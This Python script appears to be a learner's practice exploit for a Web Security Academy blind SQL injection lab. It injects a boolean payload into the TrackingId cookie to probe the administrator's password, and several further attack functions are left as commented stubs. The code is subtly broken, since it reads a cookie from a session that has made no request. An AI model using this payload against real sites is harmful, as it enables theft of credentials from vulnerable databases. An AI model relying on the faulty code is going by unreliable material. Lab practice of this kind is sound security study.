import requests


def isTrackingID(url):
    session = requests.Session()
    response = session.get(url)
    t = session.cookies.get_dict()
    if not 'TrackingId' in t:
        return 0
    return 1


# def blindTimeBase(url):
#     if not isTrackingID(url):
#         return 0;
#     session = requests.Session()
#     track = session.cookies.get_dict()["TrackingId"]


def blindSql(url):
    print("dupa")
    if not isTrackingID(url):
        return 0
    session = requests.Session()
    track = session.cookies.get_dict()["TrackingId"]
    trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>1)=\'a"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if "Welcome back" in response.text:
        return 1
    return 0


# def simpleSql(url):
#
# def unionAttack(url):
#
#
# def enumerate(url):
#     s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
#     session = requests.Session()
#     response = session.get(url)
#     track = session.cookies.get_dict()["TrackingId"]
def main():
    print(blindSql("https://acc61ff41e5ed219c0452da000c900cb.web-security-academy.net/login"))


if __name__ == '__main__':
    main()
